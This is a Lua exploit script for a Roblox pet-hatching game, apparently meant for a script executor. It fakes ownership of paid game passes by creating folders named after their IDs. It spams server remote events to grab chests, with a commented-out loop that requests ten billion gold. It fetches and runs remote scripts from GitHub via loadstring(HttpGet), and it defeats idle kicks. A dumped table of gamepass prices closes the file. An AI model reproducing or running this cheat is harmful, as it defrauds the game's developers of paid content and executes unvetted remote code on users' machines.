local gamepassArray = {"24168878", "24632251", "24632386", "25427259", "21654909", "21655678", "21655814", "21656068", "21656296", "21656393", "21656472", "21656599", "1207863717"}
for i=1,#gamepassArray do
    local Folder = Instance.new("Folder")
    Folder.Name = gamepassArray[i]
    Folder.Parent = lplr.PlayerData.GamePasses
end

-- while wait(1) do
--     local string_1 = "10000000000";
--     local Target = rs.Events.GoldBank;
--     Target:InvokeServer(string_1);
--     local Target = rs.Events.GetGroupChest;
--     Target:InvokeServer();
-- end

loadstring(game:HttpGet("https://raw.githubusercontent.com/AnonymousErrors/hub1/main/main.lua"))()

loadstring(game:HttpGet(("https://raw.githubusercontent.com/novaghoul/Roblox/main/Script/1st.lua"), true))() -- 1st Lua
loadstring(game:HttpGet(("https://raw.githubusercontent.com/novaghoul/Roblox/main/Script/WS.lua"), true))()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/novaghoul/Roblox/main/Script/Inf_Jump_Other.lua"), true))()

while wait() do
    if wp.Chest:FindFirstChild("IceChest") then
        local userdata_1 = wp.Chest.IceChest;
        local bool_1 = true;
        local Target = rs.Events.GiveTarget;
        Target:InvokeServer(userdata_1, bool_1);
        wait()
    end
end

plrs = game:GetService("Players")
lplr = plrs.LocalPlayer
virtualUser = game:GetService("VirtualUser")
lplr.Idled:connect(
    function()
        virtualUser:CaptureController()
        virtualUser:ClickButton2(Vector2.new())
    end
)


return {
	Gamepasses = {
		["24168878"] = {
			ID = 24168878, 
			Price = 1199, 
			Name = "Ultra Egg!"
		}, 
		["24632251"] = {
			ID = 24632251, 
			Price = 400, 
			Name = "Lucky!"
		}, 
		["24632386"] = {
			ID = 24632386, 
			Price = 150, 
			Name = "Auto Hatch!"
		}, 
		["25427259"] = {
			ID = 25427259, 
			Price = 250, 
			Name = "Flyingboard!"
		}, 
		["21654909"] = {
			ID = 21654909, 
			Price = 399, 
			Name = "Vip!"
		}, 
		["21655678"] = {
			ID = 21655678, 
			Price = 36, 
			Name = "Sprint!"
		}, 
		["21655814"] = {
			ID = 21655814, 
			Price = 149, 
			Name = "x2 EXP!"
		}, 
		["21656068"] = {
			ID = 21656068, 
			Price = 799, 
			Name = "Triple Eggs!"
		}, 
		["21656296"] = {
			ID = 21656296, 
			Price = 199, 
			Name = "Fast Open!"
		}, 
		["21656393"] = {
			ID = 21656393, 
			Price = 99, 
			Name = "Small Backpack!"
		}, 
		["21656472"] = {
			ID = 21656472, 
			Price = 399, 
			Name = "Big Backpack!"
		}, 
		["21656599"] = {
			ID = 21656599, 
			Price = 499, 
			Name = "8 Pets Equipped!"
		}
	}, 
	LimitedTime = {
		["1207863717"] = {
			Name = "15 Pet Equip!"
		}
	}
};